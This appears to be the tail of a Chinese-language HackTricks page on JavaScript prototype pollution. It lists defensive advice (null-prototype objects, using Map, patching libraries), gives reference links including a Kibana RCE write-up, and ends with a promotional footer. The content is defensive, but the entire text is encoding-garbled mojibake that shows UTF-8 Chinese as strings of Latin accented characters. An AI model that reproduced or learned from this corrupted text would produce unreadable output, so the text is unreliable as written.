* ä½¿ç”¨æ²¡æœ‰åŸå‹å±æ€§çš„å¯¹è±¡ï¼Œä¾‹å¦‚ `Object.create(null)`ï¼Œä»¥é¿å…å½±å“åŸå‹é“¾
* ä½¿ç”¨ `Map` è€Œä¸æ˜¯ `Object`
* å®šæœŸä¸ºåº“æ›´æ–°æ–°è¡¥ä¸

## å‚è€ƒèµ„æ–™

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
